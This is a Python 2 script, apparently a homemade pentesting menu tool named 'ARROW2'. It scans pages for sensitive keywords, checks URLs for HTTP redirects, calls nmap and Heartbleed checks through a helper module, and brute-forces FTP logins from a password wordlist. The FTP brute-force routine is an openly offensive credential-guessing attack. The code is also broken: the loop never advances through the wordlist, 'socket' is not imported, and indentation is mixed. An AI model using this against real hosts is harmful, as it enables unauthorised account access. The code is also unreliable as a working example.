import requests
from optparse import OptionParser
import automate_nmap
import os
from ftplib import FTP
urlfile=""
payload=""


def sendingreq(i):
	arr=['admin','wp-content','api-key','password', 'xss','key','tokens','wp-admin','adminpanel','backdoor','.git','.svn','.idea','hiddendirectory','hidden']
	print "scaning "+i+"......................................................................................................."	
	try:
		req=requests.get(i)
		
		for j in arr:
			print "checking for "+j
			if j in req.text:
				print "[+]Found "+j
			else:
				print "[-]Not found "+j
	except:
		print "Unexpected error in"+i

def httpdetection():
 	obj1=open('url.txt','r')
 	obj2=open('output.txt','w')
	print "url                                     http/not http       status code"
	print "======================================================================="
	for i in obj1.readlines():
		i=i.strip('\n')
		ru="http://"+i
		try:
			req=requests.get(ru)
				
			if( req.history ):
				print ""
				print "[-]"+ru+"  "+str(req.status_code)
				st="[-]"+ru+"  "+str(req.status_code)
				obj2.write(st)
				obj2.write('\n')
			else:
				print ""
				print "[+]"+ru+"  "+str(req.status_code)
				st= "[-]" + ru + "  " + str(req.status_code)
				obj2.write(st)
				obj2.write('\n')
		except:
			print ru+"  req not possible"

def ftp_brute(username,hostname):
	user = username
	host=hostname
	ftp = FTP(hostname)
	itr=0
	lines = [line.rstrip('\n') for line in open('ftp_pass.txt','r')]
	while itr < len(lines):
	    password = lines[0]
	    try:
	        print "[-]Trying "+password
	        ftp.login(user,password)
	        print "[+]Login Successful"+ password
	    except socket.error as error:
	        ftp=FTP(hostname)
	    except Exception, e:
	        itr=itr+1 
	    
	
def nmap_scan():
    automate_nmap.scan()
    


def heart_bleed():
    automate_nmap.heartbleed()
    


    
def main():
	parser = OptionParser(usage=" -p <payload> -u <URL> -U <file of urls> ")
	parser.add_option("-p" , dest="payload", help="payload file",metavar="FILE")
	parser.add_option("-u",  dest="url" , help="just place url")
	parser.add_option("-U", dest="urlfile" , help="file containing urls",metavar="FILE")
	(options, args) = parser.parse_args()
	payload=options.payload
	urlfile=options.urlfile
	

	print "ARROW2 here to help!!!!!!!!!!!!!!!!!!!!!!! "	
	print "[1] Source code analzing"
	print "[2] Check for http"
	print "[3] Automate the full nmap scan"
	print "[4] Check for heartbleed"
	print "[5] FTP bruteforce"
	print "                           "
	choice=raw_input("choice?")	
	print ""
	if choice == '1':
		filep=open("url.txt",'r')
		for i in filep.readlines():
			i=i.strip('\n')
			sendingreq(i)
        elif choice == '2':
            httpdetection()
        elif choice == '3':
            nmap_scan()
        elif choice == '4':
            heart_bleed()
        elif choice == '5':
            print "[*]Enter the username"
            user=raw_input()
            print "[*]Enter the hostname"
            hostname=raw_input()
            ftp_brute(user,hostname)
        print "[*]Please enter 1,2,3,4,5"

main()
	

